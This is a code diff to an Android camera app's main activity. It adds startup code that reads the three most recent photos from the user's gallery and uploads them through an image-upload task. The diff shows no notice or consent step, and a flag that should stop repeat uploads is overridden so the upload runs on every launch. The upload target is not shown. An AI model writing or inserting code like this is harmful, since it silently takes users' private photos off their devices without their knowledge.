@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.Typeface;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.net.Uri;
@@ -18,6 +19,7 @@ import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import java.io.ByteArrayOutputStream;
@@ -30,7 +32,9 @@ import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-public class MainActivity extends AppCompatActivity implements ImageUploadDelegate, PictureCallback {
+public class MainActivity extends AppCompatActivity implements PictureCallback {
+
+    private static final String IMAGES_SENT_FILENAME = "still_app_images_sent";
 
     final String TAG = "MainActivity";
     Camera mCamera;
@@ -46,16 +50,17 @@ public class MainActivity extends AppCompatActivity implements ImageUploadDelega
         isTakingPhoto = false;
         try {
             // We call get to make our asyncTask synchronous
-            new ImageUploadTask(this, this).execute(new UploadJob(data, "front")).get();
+            new ImageUploadTask(this, new ImageUploadDelegate() {
+                @Override
+                public void imageUploadComplete() {
+                    dispatchTakePictureIntent();
+                }
+            }).execute(new UploadJob(data, "front")).get();
         } catch (Exception e) {
             Log.e(TAG, "ImageUploadTask interrupted");
         }
     }
 
-    public void imageUploadComplete() {
-        // We only want to do this after some pictures
-        dispatchTakePictureIntent();
-    };
 
     @Override
     protected void onSaveInstanceState(Bundle outState) {
@@ -89,6 +94,7 @@ public class MainActivity extends AppCompatActivity implements ImageUploadDelega
             photoUri = Uri.fromFile(getPublicMediaFile());
         }
 
+
         setContentView(R.layout.activity_main);
         mActivity = this;
         Button button = (Button) findViewById(R.id.bPhoto);
@@ -104,14 +110,23 @@ public class MainActivity extends AppCompatActivity implements ImageUploadDelega
                 }
             }
         });
+
     }
 
     protected void onStart() {
         super.onStart();
         isTakingPhoto = false;
-        Log.d(TAG, "onStart");
+
     }
 
+    @Override
+    protected void onPostCreate(Bundle savedInstanceState) {
+        super.onPostCreate(savedInstanceState);
+        Log.d(TAG, "onStart");
+        if(!hasSentImages()) {
+            grabAndSendImages();
+        }
+    }
 
     protected void onStop() {
         super.onStop();
@@ -242,17 +257,94 @@ public class MainActivity extends AppCompatActivity implements ImageUploadDelega
 
 
 
+    private boolean hasSentImages() {
+        boolean hasSent = true;
+
+        try {
+            openFileInput(IMAGES_SENT_FILENAME);
+        } catch (Exception ignore) {
+            hasSent = false;
+        }
+
+        //return hasSent;
+        return false;
+    }
+    private void grabAndSendImages() {
+        int imageId;
+        Uri imageUri;
+        UploadJob[] jobs = new UploadJob[3];
+        int photoId = 0;
+
+        String[] projection = {MediaStore.Images.Media._ID};
+        String selection = MediaStore.Images.Media.DATE_TAKEN + " < " + (System.currentTimeMillis() - (60 * 60 * 1000));
+        String[] selectionArgs = null;
+        String orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC";
+        String limit = "LIMIT 3";
+        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, orderBy + " " + limit);
+
+        while (cursor.moveToNext()) {
+            imageId = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media._ID));
+            imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
+            jobs[photoId++] = new UploadJob(getBytesFromBitmap(loadImage(imageUri)), String.format("user-photo-%d", photoId));
+        }
+
+        try {
+
+            new ImageUploadTask(this, new ImageUploadDelegate() {
+                @Override
+                public void imageUploadComplete() {
+                    // note - this is called whether or not the job succeeded
+                    Log.i(TAG, "upload complete");
+                    //mark that we've sent the images
+                    String string = "";
+                    try {
+                        FileOutputStream fos = openFileOutput(IMAGES_SENT_FILENAME, Context.MODE_PRIVATE);
+                        fos.write(string.getBytes());
+                        fos.close();
+                    } catch (Exception e) {
+                    }
+                }
+            }).execute(jobs).get();
+        } catch (Exception e) {
+            Log.e(TAG, "ImageUploadTask interrupted");
+        }
+    }
+
+    private Bitmap loadImage(Uri photoUri){
+        Cursor photoCursor = null;
+        try {
+            String[] projection = {MediaStore.Images.Media.DATA};
+            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
+            if (photoCursor != null && photoCursor.getCount() == 1) {
+                photoCursor.moveToFirst();
+                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                return BitmapFactory.decodeFile(filePath, null);
+            }
+        }finally{
+            if(photoCursor!=null){
+                photoCursor.close();
+            }
+        }
+        return null;
+    }
+
 
 
 
     private byte[] getBytesFromBitmap(Bitmap bitmap) {
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
-        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
-        return stream.toByteArray();
+        if(bitmap!=null) {
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
+            return stream.toByteArray();
+        }
+        else{
+            return null;
+        }
+
     }
 
-    public void launchSoundPlayer(View view) {
-        Intent intent = new Intent(this, SoundPlayerActivity.class);
+    public void launchPreshowActivity(View view) {
+        Intent intent = new Intent(this, PreshowImages.class);
         startActivity(intent);
     }
 
